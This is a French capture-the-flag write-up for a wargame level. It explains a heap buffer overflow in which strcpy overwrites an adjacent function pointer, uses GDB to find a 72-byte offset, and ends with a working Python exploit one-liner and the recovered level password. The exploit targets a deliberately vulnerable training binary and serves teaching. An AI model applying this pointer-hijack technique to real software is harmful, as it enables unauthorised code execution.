# Niveau 6: Débordement de Tampon sur le Tas et Détournement de Pointeur de Fonction

## Aperçu du Défi

Le niveau 6 implique l'exploitation d'une vulnérabilité de débordement de tampon sur le tas (heap overflow) pour récupérer le mot de passe du niveau suivant.

## Code Source

En utilisant Ghidra, on obtient un code source du binaire qui ressemble à ceci:

```c
void n(void)
{
  system("/bin/cat /home/user/level7/.pass");
  return;
}

void m(void *param_1, int param_2, char *param_3, int param_4, int param_5)
{
  puts("Nope");
  return;
}

int main(int argc, char **argv)
{
  char *buffer;
  void (**function_ptr)(void);

  buffer = (char *)malloc(64);
  function_ptr = malloc(4);
  *function_ptr = m;
  strcpy(buffer, argv[1]);
  (*function_ptr)();
  return 0;
}
```

## Analyse du Code Source

En examinant le code source, nous pouvons identifier une vulnérabilité de débordement de tampon sur le tas:

1. Le programme alloue un tampon de 64 octets sur le tas avec `malloc()`
2. Il alloue ensuite un pointeur de fonction de 4 octets sur le tas et le fait pointer vers la fonction `m()`
3. Il copie l'entrée utilisateur dans le tampon en utilisant `strcpy()` sans vérification de taille
4. Enfin, il appelle la fonction pointée par le pointeur de fonction

Comme `strcpy()` ne vérifie pas les limites, nous pouvons déborder le tampon et potentiellement écraser le pointeur de fonction. Si nous pouvons remplacer l'adresse de `m()` par celle de `n()`, nous pouvons faire en sorte que le programme affiche le mot de passe du niveau 7.

## Vulnérabilité

La vulnérabilité réside dans l'utilisation de `strcpy()` pour copier l'entrée utilisateur dans un tampon alloué sur le tas sans vérifier la taille de l'entrée. Cela permet à un attaquant de déborder le tampon et d'écraser la mémoire adjacente, y compris le pointeur de fonction.

## Étapes d'Exploitation

1. Déterminer l'adresse de la fonction `n()`

   ```
   (gdb) disas n
   ```

2. Déterminer combien de remplissage (padding) est nécessaire pour atteindre le pointeur de fonction

   - Nous savons que le tampon fait 64 octets
   - Mais comme les deux sont alloués avec malloc, nous devons déterminer le décalage exact. Cela est dû au fait que malloc ajoute des métadonnées à chaque allocation (comme des informations de taille et des rembourrages d'alignement), créant un espace supplémentaire entre des allocations consécutives sur le tas.

3. Créer une chaîne d'exploitation avec le remplissage + l'adresse de `n`

   ```bash
   ./level6 $(python -c 'print "A"*[OFFSET] + "\x[n_ADDR]"')
   ```

4. Exécuter l'exploit et obtenir le mot de passe

## Obtention du Mot de Passe

D'abord, trouvons l'adresse de la fonction `n()`:

```
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
   ...
```

L'adresse de `n` est 0x08048454.

Ensuite, nous devons déterminer le décalage exact entre le tampon et le pointeur de fonction. Nous pouvons le faire en utilisant GDB en examinant les adresses mémoire des appels malloc:

```bash
(gdb) disas main
    0x0804848c <+16>:    call   0x8048350 <malloc@plt>
    0x08048491 <+21>:    mov    %eax,0x1c(%esp)
    ...
    0x0804849c <+32>:    call   0x8048350 <malloc@plt>
    0x080484a1 <+37>:    mov    %eax,0x18(%esp)
```

```
(gdb) break main
(gdb) run test
(gdb) break *0x08048491  # Point d'arrêt après le premier malloc. Le '*' indique que nous voulons nous arrêter à l'adresse de l'instruction.
(gdb) cont               # Exécute le programme jusqu'à ce qu'il atteigne le point d'arrêt
(gdb) x $eax             # Affiche l'adresse renvoyée par le premier malloc (buffer)
0x804a008:      0x00000000
(gdb) break *0x080484a1  # Point d'arrêt après le second malloc
(gdb) cont
(gdb) x $eax             # Affiche l'adresse renvoyée par le second malloc (pointeur de fonction)
0x804a050:      0x00000000
```

Calcul de la différence: 0x804a050 - 0x804a008 = 0x48 (72 en décimal)

Nous pouvons donc confirmer qu'un décalage de 72 octets est nécessaire pour atteindre et écraser le pointeur de fonction:

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

Cette commande exécutera le programme avec notre entrée créée sur mesure, provoquant l'appel de la fonction `n()` qui affichera le contenu de `/home/user/level7/.pass`.

```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
